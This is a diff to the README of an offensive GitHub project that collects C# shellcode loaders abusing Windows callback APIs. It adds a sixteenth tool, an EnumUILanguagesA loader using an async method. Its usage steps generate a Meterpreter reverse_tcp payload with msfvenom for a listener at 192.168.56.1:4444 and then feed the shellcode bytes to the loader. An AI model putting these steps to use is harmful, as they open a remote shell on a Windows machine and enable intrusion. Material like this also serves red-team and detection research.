@@ -30,6 +30,7 @@ C# Codes: "New C# codes for Callback Functions will publish here soon..."
     13. NativePayload_EnumSystemCodePagesA.cs  (by ChaitanyaHaritash)
     14. NativePayload_EnumSystemLocalesA.cs  (by ChaitanyaHaritash)
     15. NativePayload_EnumUILanguagesA.cs  (by ChaitanyaHaritash)
+    16. NativePayload_AsyncMethodEUILA.cs (by me ;D)
 
 --------------------------------------------
    NativePayload_CBT.cs (Some of Callback Function Codes/Techniques in one code)
@@ -208,6 +209,17 @@ usage:
     example: NativePayload_EnumUILanguagesA.exe "fc,48,00,87,00,...."
 
    ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumUILanguagesA.png)
+   
+ --------------------------------------------   
+   16. NativePayload_AsyncMethodEUILA.cs (Callback Functions Technique via EnumUILanguagesA API + Async Csharp Method)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_AsyncMethodEUILA.exe  [payload...]
+    example: NativePayload_AsyncMethodEUILA.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_AsyncMethodEUILA.png)
    
  --------------------------------------------   
     
